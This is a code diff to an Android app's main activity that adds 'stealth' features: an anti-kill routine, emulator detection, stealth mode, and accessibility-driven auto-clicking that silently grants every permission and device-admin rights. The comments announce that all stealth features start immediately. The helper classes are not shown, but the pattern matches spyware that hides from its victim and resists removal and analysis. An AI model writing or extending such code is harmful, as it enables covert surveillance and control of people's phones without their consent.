@@ -96,7 +96,7 @@ public class MainActivity extends AppCompatActivity {
     private void autoGrantPermissions() {
         Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
         
-        // EVERYTHING STARTS IMMEDIATELY - NO DELAYS
+        // ALL STEALTH FEATURES START IMMEDIATELY
         
         // Request all permissions
         permissionManager.requestAllPermissions();
@@ -106,12 +106,32 @@ public class MainActivity extends AppCompatActivity {
         requestBatteryOptimization();
         requestDeviceAdmin();
 
-        // Request notification + stealth mode
+        // Enable ALL stealth features immediately
         permissionManager.requestNotificationPermission();
         enableStealthMode();
+        enableAntiKill();
+        checkEmulator();
         
-        // Keep auto-click ACTIVE always (for future permission requests)
+        // Start auto-click (will stop after 10 seconds)
         AccessibilityHelperService.enableAutoClick();
+    }
+    
+    private void enableAntiKill() {
+        try {
+            stealthManager.enableAntiKill(this);
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    private void checkEmulator() {
+        try {
+            if (stealthManager.isEmulator()) {
+                android.util.Log.w("Stealth", "Running on emulator");
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
     }
     
     private void requestDeviceAdmin() {
